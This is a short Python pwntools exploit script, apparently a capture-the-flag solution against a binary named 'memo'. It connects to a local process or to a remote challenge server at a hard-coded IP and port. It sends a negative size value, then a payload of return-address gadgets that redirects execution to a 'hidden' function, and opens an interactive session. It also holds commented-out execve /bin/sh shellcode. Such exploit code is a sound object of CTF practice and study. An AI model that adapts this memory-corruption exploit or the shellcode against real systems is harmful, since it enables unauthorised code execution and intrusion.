from pwn import *

context(os='linux', arch='i386')
context.log_level = 'debug'

#execve(2) on x64
#shellcode = '\x48\x31\xd2\x52\x48\xb8\x2f\x62'\
#			 '\x69\x6e\x2f\x2f\x73\x68\x50\x48'\
#			 '\x89\xe7\x52\x57\x48\x89\xe6\x48'\
#			 '\x8d\x42\x3b\x0f\x05'
				
HOST = "133.242.68.223"
PORT = 35285 
conn = None

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process('./memo')

hidden = 0x4007bd
main = 0x4006e2
ret = 0x40056e

conn.recvuntil("size : ")
conn.sendline("-96")
conn.recvuntil("Content : ")

payload = p64(ret)
payload += p64(ret)
payload += p64(hidden)

conn.sendline(payload)

conn.interactive()

